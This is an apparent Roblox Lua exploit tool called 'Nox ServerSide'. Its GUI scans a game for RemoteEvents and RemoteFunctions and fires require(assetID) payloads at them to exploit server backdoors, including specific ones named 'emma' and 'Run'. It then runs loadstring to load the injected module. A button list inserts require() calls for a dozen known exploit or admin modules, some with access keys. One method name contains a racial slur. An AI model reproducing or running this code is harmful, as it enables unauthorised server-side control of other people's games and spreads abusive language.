--[Nox ServerSide]--

local Players = game:GetService("Players")

local Player = Players.LocalPlayer

local PlayerGui = Player:WaitForChild("PlayerGui")

local TweenService = game:GetService("TweenService")

-- GUI Setup

local screenGui = Instance.new("ScreenGui", PlayerGui)

screenGui.Name = "Nox_SS"

screenGui.ResetOnSpawn = false

-- Toggle Button

local toggleButton = Instance.new("ImageButton", screenGui)

toggleButton.Size = UDim2.new(0, 50, 0, 50)

toggleButton.Position = UDim2.new(0, 50, 0, 20)

toggleButton.Image = "rbxassetid://105639864058631"

toggleButton.BackgroundColor3 = Color3.new(0, 0, 0)

toggleButton.Visible = false

toggleButton.Active = true

toggleButton.Draggable = true

Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 5)

Instance.new("UIStroke", toggleButton).Color = Color3.new(5, 5, 5)

-- Main Frame

local mainFrame = Instance.new("Frame", screenGui)

mainFrame.Position = UDim2.new(0.5, -5, 0.5, -20)

mainFrame.Size = UDim2.new(0, 510, 0, 250)

mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)

mainFrame.BackgroundTransparency = 0

mainFrame.BorderSizePixel = 1

mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)

mainFrame.Active = false

mainFrame.Draggable = false

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

-- Scrolling Frame

local scroll = Instance.new("ScrollingFrame", mainFrame)

scroll.Size = UDim2.new(0.2, 0, 0.4, 20)

scroll.Position = UDim2.new(0.0, 20, 0.2, 10)

scroll.BackgroundColor3 = Color3.new(1, 1, 1)

scroll.BorderColor3 = Color3.new(0, 0, 0)

scroll.BorderSizePixel = 1

scroll.BackgroundTransparency = 1

Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 10)

-- Title

local title = Instance.new("TextLabel", mainFrame)

title.Text = "Nox"

title.Font = Enum.Font.GothamBold

title.TextSize = 22

title.TextColor3 = Color3.new(128, 0, 128)

title.BackgroundTransparency = 1

title.Size = UDim2.new(2 , -40, 0, 40)

title.Position = UDim2.new(0.4 , 34, 0)

title.TextXAlignment = Enum.TextXAlignment.Left

-- Title 2

local title2 = Instance.new("TextLabel", mainFrame)

title2.Text = "Server Side"

title2.Font = Enum.Font.GothamBold

title2.TextSize = 22

title2.TextColor3 = Color3.new(128, 0, 128)

title2.BackgroundTransparency = 1

title2.Size = UDim2.new(2 , -40, 0, 40)

title2.Position = UDim2.new(0.4 , 1, 0.0 , 16)

title2.TextXAlignment = Enum.TextXAlignment.Left

-- Title 3

local title3 = Instance.new("TextLabel", mainFrame)

title3.Text = "Version : 1.9"

title3.Font = Enum.Font.GothamBold

title3.TextSize = 12

title3.TextColor3 = Color3.new(128, 0, 128)

title3.BackgroundTransparency = 1

title3.Size = UDim2.new(2 , -40, 0, 40)

title3.Position = UDim2.new(0.4 , 25, 0.0 , 30)

title3.TextXAlignment = Enum.TextXAlignment.Left

-- Title

local Nox = Instance.new("ImageLabel", mainFrame)

Nox.BackgroundTransparency = 1

Nox.Image = "rbxassetid://105639864058631"

Nox.Size = UDim2.new(0 , 50, 0, 50)

Nox.Position = UDim2.new(0.0 , 5, 0.0 , 5)

Instance.new("UICorner", Nox).CornerRadius = UDim.new(1, 0)

Instance.new("UIStroke", Nox).Color = Color3.new(5, 5, 5)

-- Close Button

local closeBtn = Instance.new("TextButton", mainFrame)

closeBtn.Text = "X"

closeBtn.Font = Enum.Font.GothamBold

closeBtn.TextColor3 = Color3.new(1, 1, 1)

closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)

closeBtn.Size = UDim2.new(0, 30, 0, 30)

closeBtn.Position = UDim2.new(1, -35, 0, 5)

Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

closeBtn.MouseButton1Click:Connect(function()

    mainFrame.Visible = false

    toggleButton.Visible = true

end)

toggleButton.MouseButton1Click:Connect(function()

    mainFrame.Visible = true

    toggleButton.Visible = false

end)

-- Inject Button

local injectButton = Instance.new("TextButton", mainFrame)

injectButton.Position = UDim2.new(0.6, -119, 1, -55)

injectButton.Size = UDim2.new(0, 140, 0, 40)

injectButton.BackgroundColor3 = Color3.fromRGB(30, 120, 30)

injectButton.Text = "Inject"

injectButton.Font = Enum.Font.Gotham

injectButton.TextColor3 = Color3.new(1, 1, 1)

injectButton.TextSize = 16

Instance.new("UICorner", injectButton).CornerRadius = UDim.new(0, 10)

-- Input Box

local requireInput = Instance.new("TextBox", mainFrame)

requireInput.PlaceholderText = "-- Nox Server Side "

requireInput.Position = UDim2.new(0.5, -145, 0, 60)

requireInput.Size = UDim2.new(0, 360, 0, 120)

requireInput.TextSize = 16

requireInput.TextColor3 = Color3.new(1, 1, 1)

requireInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

requireInput.Font = Enum.Font.Gotham

requireInput.Text = ""

requireInput.TextXAlignment = Enum.TextXAlignment.Left

requireInput.TextYAlignment = Enum.TextYAlignment.Top

Instance.new("UICorner", requireInput).CornerRadius = UDim.new(0, 4)

-- Execute Button

local executeBtn = Instance.new("TextButton", mainFrame)

executeBtn.Position = UDim2.new(0.5, -70, 1, -120)

executeBtn.Size = UDim2.new(0, 140, 0, 40)

executeBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 30)

executeBtn.Text = "Execute"

executeBtn.Font = Enum.Font.Gotham

executeBtn.TextColor3 = Color3.new(1, 1, 1)

executeBtn.TextSize = 16

executeBtn.Visible = false

Instance.new("UICorner", executeBtn).CornerRadius = UDim.new(0, 10)

-- Hover effect

mainFrame.MouseEnter:Connect(function()

    TweenService:Create(mainFrame, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()

end)

mainFrame.MouseLeave:Connect(function()

    TweenService:Create(mainFrame, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()

end)

-- Utility Functions

local function attached()

    return Player:FindFirstChild("PlayerGui"):FindFirstChild("Injected!") and true

end

local function updateLED()

    executeBtn.Visible = attached()

end

local function scanGame()

    local ID = requireInput.Text or "ID"

    local requireScript = ("require(%s).TARGET('%s', %s)"):format(ID, Player.Name, "true")

    

    local function notify(text)

        game:GetService("StarterGui"):SetCore("SendNotification", {

            Title = "Nox" ,

            Duration = 2,

            Text = text

        })

    end

    local function validRemote(rm)

        if rm:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then return false end

        if rm:IsDescendantOf(game:GetService("JointsService")) then return false end

        return true

    end

    local function emmaBackdoor(rm)

        return rm.Name == "emma" and rm.Parent and rm.Parent.Name == "mynameemma"

    end

    local function runBackdoor(rm)

        local p = rm.Parent

        return rm.Name == "Run" and p and p:FindFirstChild("Pages") and p:FindFirstChild("R6")

    end

    notify("Scanning ServerSide...")

    for _, obj in ipairs(game:GetDescendants()) do

        if not validRemote(obj) then continue end

        if obj.ClassName == "RemoteEvent" then

            if emmaBackdoor(obj) then obj:FireServer(",", requireScript) end

            if runBackdoor(obj) then obj:FireServer("5#lGIERKWEF", requireScript) end

            if not attached() then obj:FireServer(requireScript) end

        elseif obj.ClassName == "RemoteFunction" then

            pcall(function()

                obj:InvokeServer(requireScript)

            end)

        end

    end

end

injectButton.MouseButton1Click:Connect(function()

    scanGame()

    task.wait(2)

    updateLED()

end)

executeBtn.MouseButton1Click:Connect(function()

    local ID = requireInput.Text

    if ID and tonumber(ID) then

        loadstring("require("..ID..").TARGET('"..Player.Name.."', true)")()

    end

end)

-- Ro-Xploit v7

local polariaBtn = Instance.new("TextButton", scroll)

polariaBtn.Size = UDim2.new(0, 70, 0, 30)

polariaBtn.Position = UDim2.new(0, 9.0, 0, 0)

polariaBtn.Text = "Ro-Xploit v7"

polariaBtn.BackgroundColor3 = Color3.new(0, 0, 0)

polariaBtn.TextColor3 = Color3.new(0, 0, 0)

polariaBtn.Font = Enum.Font.Gotham

polariaBtn.TextSize = 11

Instance.new("UICorner", polariaBtn).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", polariaBtn).Color =  Color3.new(5, 5, 5)

polariaBtn.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(96184029574075)("'..Player.Name..'")'

end)

-- ExSer

local exserBtn = Instance.new("TextButton", scroll)

exserBtn.Size = UDim2.new(0, 70, 0, 30)

exserBtn.Position = UDim2.new(0, 9.0, 0, 35)

exserBtn.Text = "ExSer"

exserBtn.BackgroundColor3 = Color3.new(0, 0, 0)

exserBtn.TextColor3 = Color3.new(0, 0, 0)

exserBtn.Font = Enum.Font.Gotham

exserBtn.TextSize = 16

Instance.new("UICorner", exserBtn).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", exserBtn).Color =  Color3.new(5, 5, 5)

exserBtn.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(10868847330):pls("'..Player.Name..'") -- [Key : c00lkidds]'

end)

-- K00pgui v11

local hdAdminBtn = Instance.new("TextButton", scroll)

hdAdminBtn.Size = UDim2.new(0, 70, 0, 30)

hdAdminBtn.Position = UDim2.new(0, 9.0, 0, 70)

hdAdminBtn.Text = "K00pkidd v11"

hdAdminBtn.BackgroundColor3 = Color3.new(0, 0, 0)

hdAdminBtn.TextColor3 = Color3.new(0, 0, 0)

hdAdminBtn.Font = Enum.Font.Gotham

hdAdminBtn.TextSize = 11

Instance.new("UICorner", hdAdminBtn).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", hdAdminBtn).Color =  Color3.new(5, 5, 5)hdAdminBtn.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(15267263357).V11("'..Player.Name..'")'

end)

-- Infinite Yield SS

local AdminBtn = Instance.new("TextButton", scroll)

AdminBtn.Size = UDim2.new(0, 70, 0, 30)

AdminBtn.Position = UDim2.new(0, 9.0, 0, 105)

AdminBtn.Text = "IY [Edit]"

AdminBtn.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn.TextColor3 = Color3.new(0, 0, 0)

AdminBtn.Font = Enum.Font.Gotham

AdminBtn.TextSize = 15

Instance.new("UICorner", AdminBtn).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn).Color =  Color3.new(5, 5, 5)AdminBtn.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(15610593870)("'..Player.Name..'")'
end)

-- T0pk3k v5

local AdminBtn2 = Instance.new("TextButton", scroll)

AdminBtn2.Size = UDim2.new(0, 70, 0, 30)

AdminBtn2.Position = UDim2.new(0, 9.0, 0, 140)

AdminBtn2.Text = "T0pk3k v5"

AdminBtn2.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn2.TextColor3 = Color3.new(0, 0, 0)

AdminBtn2.Font = Enum.Font.Gotham

AdminBtn2.TextSize = 15

Instance.new("UICorner", AdminBtn2).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn2).Color =  Color3.new(5, 5, 5)AdminBtn2.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(0x342D5F0DA)("'..Player.Name..'")'

end)

-- HappyHub SS

local AdminBtn3 = Instance.new("TextButton", scroll)

AdminBtn3.Size = UDim2.new(0, 70, 0, 30)

AdminBtn3.Position = UDim2.new(0, 9.0, 0, 175)

AdminBtn3.Text = "HappyHub SS"

AdminBtn3.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn3.TextColor3 = Color3.new(0, 0, 0)

AdminBtn3.Font = Enum.Font.Gotham

AdminBtn3.TextSize = 10

Instance.new("UICorner", AdminBtn3).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn3).Color =  Color3.new(5, 5, 5)AdminBtn3.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(74349243416068):Hload("'..Player.Name..'")'

end)

-- Mr Bean Admin

local AdminBtn4 = Instance.new("TextButton", scroll)

AdminBtn4.Size = UDim2.new(0, 70, 0, 30)

AdminBtn4.Position = UDim2.new(0, 9.0, 0, 210)

AdminBtn4.Text = "Mr Bean Admin"

AdminBtn4.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn4.TextColor3 = Color3.new(0, 0, 0)

AdminBtn4.Font = Enum.Font.Gotham

AdminBtn4.TextSize = 9

Instance.new("UICorner", AdminBtn4).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn4).Color =  Color3.new(5, 5, 5)AdminBtn4.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(92684888032460)({Owners = {"'..Player.Name..'"}})'

end)

-- H01PK Gui V21

local AdminBtn5 = Instance.new("TextButton", scroll)

AdminBtn5.Size = UDim2.new(0, 70, 0, 30)

AdminBtn5.Position = UDim2.new(0, 9.0, 0, 245)

AdminBtn5.Text = "H01PK Gui V21"

AdminBtn5.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn5.TextColor3 = Color3.new(0, 0, 0)

AdminBtn5.Font = Enum.Font.Gotham

AdminBtn5.TextSize = 11

Instance.new("UICorner", AdminBtn5).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn5).Color =  Color3.new(5, 5, 5)AdminBtn5.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("'..Player.Name..'")'

end)

-- Tubers93 Gui v5

local AdminBtn6 = Instance.new("TextButton", scroll)

AdminBtn6.Size = UDim2.new(0, 70, 0, 30)

AdminBtn6.Position = UDim2.new(0, 9.0, 0, 280)

AdminBtn6.Text = "Tubers93 Gui v5"

AdminBtn6.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn6.TextColor3 = Color3.new(0, 0, 0)

AdminBtn6.Font = Enum.Font.Gotham

AdminBtn6.TextSize = 9

Instance.new("UICorner", AdminBtn6).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn6).Color =  Color3.new(5, 5, 5)AdminBtn6.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(0x6989826cf265)("'..Player.Name..'")'

end)

-- Cr4kgui v11

local AdminBtn7 = Instance.new("TextButton", scroll)

AdminBtn7.Size = UDim2.new(0, 70, 0, 30)

AdminBtn7.Position = UDim2.new(0, 9.0, 0, 315)

AdminBtn7.Text = "Cr4kgui v11"

AdminBtn7.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn7.TextColor3 = Color3.new(0, 0, 0)

AdminBtn7.Font = Enum.Font.Gotham

AdminBtn7.TextSize = 13

Instance.new("UICorner", AdminBtn7).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn7).Color =  Color3.new(5, 5, 5)AdminBtn7.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(132380103487790).Erika("'..Player.Name..'")'

end)

-- Nezor v1

local AdminBtn8 = Instance.new("TextButton", scroll)

AdminBtn8.Size = UDim2.new(0, 70, 0, 30)

AdminBtn8.Position = UDim2.new(0, 9.0, 0, 351)

AdminBtn8.Text = "Nezor v1"

AdminBtn8.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn8.TextColor3 = Color3.new(0, 0, 0)

AdminBtn8.Font = Enum.Font.Gotham

AdminBtn8.TextSize = 13

Instance.new("UICorner", AdminBtn8).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn8).Color =  Color3.new(5, 5, 5)AdminBtn8.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(100227259985025):Ex("'..Player.Name..'")'

end)

-- Team Fat Gui v21

local AdminBtn9 = Instance.new("TextButton", scroll)

AdminBtn9.Size = UDim2.new(0, 70, 0, 30)

AdminBtn9.Position = UDim2.new(0, 9.0, 0, 387)

AdminBtn9.Text = "Team Fat Gui v21"

AdminBtn9.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn9.TextColor3 = Color3.new(0, 0, 0)

AdminBtn9.Font = Enum.Font.Gotham

AdminBtn9.TextSize = 8

Instance.new("UICorner", AdminBtn9).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn9).Color =  Color3.new(5, 5, 5)AdminBtn9.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(14940596979).fat("'..Player.Name..'") -- [Key : teamfatguiv19easter]'

end)

-- Dream-Bull Gui v18

local AdminBtn10 = Instance.new("TextButton", scroll)

AdminBtn10.Size = UDim2.new(0, 70, 0, 30)

AdminBtn10.Position = UDim2.new(0, 9.0, 0, 423)

AdminBtn10.Text = "Dream-Bull Gui v18"

AdminBtn10.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn10.TextColor3 = Color3.new(0, 0, 0)

AdminBtn10.Font = Enum.Font.Gotham

AdminBtn10.TextSize = 8

Instance.new("UICorner", AdminBtn10).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn10).Color =  Color3.new(5, 5, 5)AdminBtn10.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(15232587754).DreamGUI("'..Player.Name..'")'

end)

-- Darius Gui v13

local AdminBtn11 = Instance.new("TextButton", scroll)

AdminBtn11.Size = UDim2.new(0, 70, 0, 30)

AdminBtn11.Position = UDim2.new(0, 9.0, 0, 459)

AdminBtn11.Text = "Darius Gui v13"

AdminBtn11.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn11.TextColor3 = Color3.new(0, 0, 0)

AdminBtn11.Font = Enum.Font.Gotham

AdminBtn11.TextSize = 11

Instance.new("UICorner", AdminBtn11).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn11).Color =  Color3.new(5, 5, 5)AdminBtn11.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(127445614272366).op("'..Player.Name..'")'

end)

-- Secret K00pgui v4

local AdminBtn12 = Instance.new("TextButton", scroll)

AdminBtn12.Size = UDim2.new(0, 70, 0, 30)

AdminBtn12.Position = UDim2.new(0, 9.0, 0, 495)

AdminBtn12.Text = "Secret K00pgui v4"

AdminBtn12.BackgroundColor3 = Color3.new(0, 0, 0)

AdminBtn12.TextColor3 = Color3.new(0, 0, 0)

AdminBtn12.Font = Enum.Font.Gotham

AdminBtn12.TextSize = 8

Instance.new("UICorner", AdminBtn12).CornerRadius = UDim.new(0, 6)

Instance.new("UIStroke", AdminBtn12).Color =  Color3.new(5, 5, 5)AdminBtn12.MouseButton1Click:Connect(function()

    requireInput.Text = 'require(16965754044):load("'..Player.Name..'") -- [Key : Zelow]'

end)

-- Buletan Image di kiri bawah

local cornerImage = Instance.new("ImageButton")

cornerImage.Name = "CornerImage"

cornerImage.Parent = screenGui

cornerImage.Size = UDim2.new(0, 50, 0, 50)

cornerImage.Position = UDim2.new(0, 10, 1, -60) -- 10px dari kiri, 60px dari bawah

cornerImage.BackgroundColor3 = Color3.new(1, 1, 1)

cornerImage.Image = "rbxassetid://105639864058631" -- Ganti ID gambar sesuai keinginan

cornerImage.BackgroundTransparency = 1 -- Atur ke 0 jika ingin ada background

-- Buat buletan

local cornerUICorner = Instance.new("UICorner", cornerImage)

cornerUICorner.CornerRadius = UDim.new(1, 0)
